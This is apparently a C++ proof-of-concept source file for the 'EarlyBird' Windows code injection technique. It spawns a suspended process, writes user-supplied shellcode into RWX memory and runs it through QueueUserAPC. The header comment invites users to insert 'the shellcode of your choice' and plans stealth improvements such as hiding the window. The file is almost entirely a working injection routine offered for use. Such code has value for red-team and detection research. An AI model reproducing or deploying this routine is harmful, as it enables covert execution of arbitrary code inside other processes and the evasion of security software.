//#include "stdafx.h"
#include <stdio.h>
#include <Windows.h>

#include "auxiliary.h"
/*
EarlyBird injection
This is a POC for the EarlyBird injection technique as named by Cyberbit, it’s a corner case of QueueUserAPC. More details here: Hackers Found Using A New Code Injection Technique to Evade Detection

Use:

Put the shellcode of your choice to the source file (the included one will pop cmd.exe)
Recompile
Run: EarlyBird.exe [any x64 binary]

Ref:
https://github.com/theevilbit/injection
https://github.com/theevilbit/injection/tree/master/EarlyBird


Improvements:
	- remove RWX
	- Add DLL support
	- Make window hidden.

*/
DWORD demoShellcodeEarlyBird(PCWSTR start_process, PBYTE pShellcode, SIZE_T szShellcodeLength )
{
	/* Start process in suspended state */
	wprintf(TEXT("[*] Creating process in suspended state\n"));
	
	// TODO make this window hidden

	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();

	//CONVERT WIDE TO CHAR
	char *commandRes = WideStringToCharString(start_process);

	CreateProcessA(0, commandRes, 0, 0, 0, CREATE_SUSPENDED, 0, 0, pStartupInfo, pProcessInfo);

	if (!pProcessInfo->hProcess)
	{
		wprintf(TEXT("[-] Error: Could not create process\n"));
		return DWORD(1);
	}
	else
		wprintf(TEXT("[+] Create process successful!\n"));
	
	/* Allocate memory in target process */
	wprintf(TEXT("[*] Allocating memory in process\n"));
	LPVOID lpBaseAddress;
	lpBaseAddress = VirtualAllocEx(pProcessInfo->hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpBaseAddress == NULL)
	{
		wprintf(TEXT("[-] Error: Couldn't allocate memory in process, exiting...\n"));
		return DWORD(1);
	}
	else
		printf("[+] Memory allocated at: 0x%x\r\n", (UINT)lpBaseAddress);
	
	SIZE_T *lpNumberOfBytesWritten = 0;
	printf("[*] Writing shellcode to process\r\n");

	BOOL resWPM;
	resWPM = WriteProcessMemory(pProcessInfo->hProcess, lpBaseAddress, (LPVOID)pShellcode, szShellcodeLength, lpNumberOfBytesWritten);
	if (!resWPM)
	{
		wprintf(TEXT("[-] Error: Couldn't write to memory in target process, exiting...\n"));
		return DWORD(1);
	}
	else
		wprintf(TEXT("[+] Shellcode is written to memory\n"));

	/* Update subclass with fake function pointer */
	DWORD i = (DWORD)lpBaseAddress;

	wprintf(TEXT("[*] Queue APC\n"));
	/* Queue APC */
	DWORD qapcret = QueueUserAPC((PAPCFUNC)lpBaseAddress, pProcessInfo->hThread, NULL);
	if (!qapcret)
		wprintf(TEXT("[-] Error: Couldn't queue APC in target process, exiting...\n"));
	else
		wprintf(TEXT("[+] QueueAPC is done\n"));

	/* Resume Thread */
	wprintf(TEXT("[*] Resuming thread....\n"));
	ResumeThread(pProcessInfo->hThread);
	return DWORD(0);
}